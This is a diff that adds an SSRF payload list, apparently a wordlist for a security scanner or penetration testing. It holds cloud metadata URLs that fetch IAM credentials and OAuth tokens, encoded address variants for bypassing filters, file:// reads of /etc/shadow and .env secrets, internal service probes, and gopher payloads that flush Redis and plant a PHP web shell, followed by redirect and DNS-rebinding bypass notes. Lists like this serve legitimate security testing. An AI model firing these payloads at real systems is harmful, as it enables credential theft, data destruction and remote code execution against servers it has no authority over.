@@ -1,0 +1,81 @@
+# SSRF Payloads
+# Cloud metadata, internal service probing, protocol smuggling
+
+# ── Cloud metadata endpoints ──────────────────────────────────────────────────
+# AWS IMDSv1 (no token required — legacy)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+# AWS IMDSv2 (needs X-aws-ec2-metadata-token header — harder to exploit via SSRF)
+http://169.254.169.254/latest/api/token
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+# Required header: Metadata-Flavor: Google
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+# Required header: Metadata: true
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+
+# Oracle Cloud
+http://169.254.169.254/opc/v1/instance/
+
+# ── IPv6 / IPv4 bypass variants ───────────────────────────────────────────────
+http://[::ffff:169.254.169.254]/latest/meta-data/
+http://0251.0376.0251.0376/latest/meta-data/   # octal
+http://0xa9fea9fe/latest/meta-data/             # hex
+http://2852039166/latest/meta-data/             # decimal
+http://169.254.169.254.nip.io/latest/meta-data/
+http://169.254.169.254.xip.io/latest/meta-data/
+
+# ── Protocol smuggling ────────────────────────────────────────────────────────
+# File read (Linux)
+file:///etc/passwd
+file:///etc/shadow
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///var/www/html/config.php
+file:///app/.env
+
+# Dict protocol (probe internal services)
+dict://127.0.0.1:6379/info          # Redis
+dict://127.0.0.1:11211/stats        # Memcached
+dict://127.0.0.1:27017/            # MongoDB
+
+# Gopher (HTTP request smuggling)
+gopher://127.0.0.1:6379/_FLUSHALL%0D%0A
+gopher://127.0.0.1:6379/_SET%20shell%20"%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E"%0D%0A
+
+# ── Internal service probing ──────────────────────────────────────────────────
+http://127.0.0.1/
+http://localhost/
+http://127.0.0.1:8080/
+http://127.0.0.1:8443/
+http://127.0.0.1:9200/           # Elasticsearch
+http://127.0.0.1:5984/           # CouchDB
+http://127.0.0.1:6379/           # Redis (use with gopher)
+http://127.0.0.1:27017/          # MongoDB
+http://127.0.0.1:2375/version    # Docker API (unauthenticated)
+http://127.0.0.1:4243/version    # Docker API (alt port)
+http://127.0.0.1:10250/pods      # Kubernetes kubelet
+http://127.0.0.1:8001/api/v1/namespaces/default/pods  # K8s API
+http://10.0.0.1/                 # Common gateway
+http://192.168.1.1/              # Common router
+
+# ── Bypass techniques ─────────────────────────────────────────────────────────
+# DNS rebinding: register a domain that alternates between allowed IP and 127.0.0.1
+# Short URL services sometimes used (t.co, bit.ly) — blocked by most WAFs
+# Redirect chain: attacker.com → 301 → 169.254.169.254
+# IPv6 mapping: ::ffff:7f00:1 = 127.0.0.1
+# Zero padding: 127.00.00.01
+# CNAME chain: internal.attacker.com CNAME 169.254.169.254
